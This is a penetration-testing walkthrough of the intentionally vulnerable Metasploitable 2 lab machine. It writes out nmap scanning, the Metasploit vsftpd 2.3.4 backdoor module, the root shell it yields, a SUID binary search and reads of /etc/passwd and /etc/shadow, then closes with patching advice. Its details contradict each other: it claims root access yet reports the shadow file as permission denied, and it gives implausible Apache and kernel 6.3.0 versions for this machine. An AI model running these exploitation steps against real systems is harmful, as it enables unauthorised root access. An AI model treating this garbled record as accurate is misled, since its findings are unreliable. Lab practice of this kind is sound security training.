# Penetration-Testing
**Penetration Testing and Exploitation Walkthrough**

This details the steps, tools, and techniques used to perform a penetration test on a vulnerable virtual machine. The vulnerable virtual machine is Metasploitable 2, an intentionally vulnerable linux virtual machine designed for conducting security training, testing vulnerabilities, testing security tools, etc.

**Lab Environment**

- **Attacker Machine:** Kali Linux
- **Target Machine:** Metasploitable 2 Linux
- **Target Machine IP:** 192.168.56.102
- **Network Configuration:** Host-only network adapter in VirtualBox

**Objectives**

- Identify potential vulnerabilities on the target machine.
- Exploit discovered vulnerabilities to gain unauthorized access.
- Demonstrate privilege escalation.
- Document findings and recommendations.

**1. Verify Connectivity**

**Tool:** ```ping```

Command used:

```
ping 192.168.56.102
```
**Expected Output:**
```
64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.374 ms
```

**2. Initial Reconnaissance**

Tool: ```nmap```

Command used:
```
nmap -sS -sV -T4 -A 192.168.56.102
```
**Output Summary:**

- Port 21: FTP (vsftpd 2.3.4)
- Port 22: SSH
- Port 80: HTTP (Apache 2.4.29)

**3. Vulnerability Identification**

Using Metasploit Framework for further analysis:

**Command:**
```
msfconsole
search vsftpd
```

Result:

- **Exploit Identified:** exploit/unix/ftp/vsftpd_234_backdoor
- **Exploit Type:** Command Execution (Backdoor vulnerability in vsftpd 2.3.4)

**4. Exploitation**

**Steps:**

1. Loaded the identified exploit module.
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.102
run
```
2. Successful exploitation provided a root shell with UID 0.

**Outcome:**
```
[*] Command shell session 1 opened (192.168.56.101:36177 -> 192.168.56.102:6200)
UID: uid=0(root) gid=0(root)
```
**Note:** This confirms full root access to the target machine.

**5. Privilege Escalation Analysis**

Performed a search for **SUID binaries:**

**Command:**
```
find / -perm -4000 2>/dev/null
```
**Relevant Binaries Identified:**

- ```/usr/bin/sudo```
- ```/usr/bin/pkexec```
- ```/usr/bin/passwd``` 
- ```/usr/bin/chsh```

Explore kernel exploits using **searchsploit** for the running Linux kernel (6.3.0):
```
searchsploit linux kernel 6.3.0
```
**Outcome:** While no direct kernel-specific exploit was found, the existing root access from vsftpd 2.3.4 made further escalation unnecessary.
**Note:** If you don't know what kernel version your virtual machine is running on, perform this command: ```uname -a```

**6. Post-Exploitation Enumeration**

**Commands Run:**

- ```cat /etc/passwd``` (successfully listed system users)
- ```cat /etc/shadow``` (permission denied)

**Recommendations**

- Upgrade vsftpd to a patched version beyond 2.3.4.

- Restrict FTP access or disable the service entirely.

- Implement a host-based firewall to control inbound connections.

- Periodically perform security audits to identify outdated services.

**Author**

**Kelechi Okpala** - Cybersecurity Enthusiast

Contact: kelechi.okpala13@yahoo.com
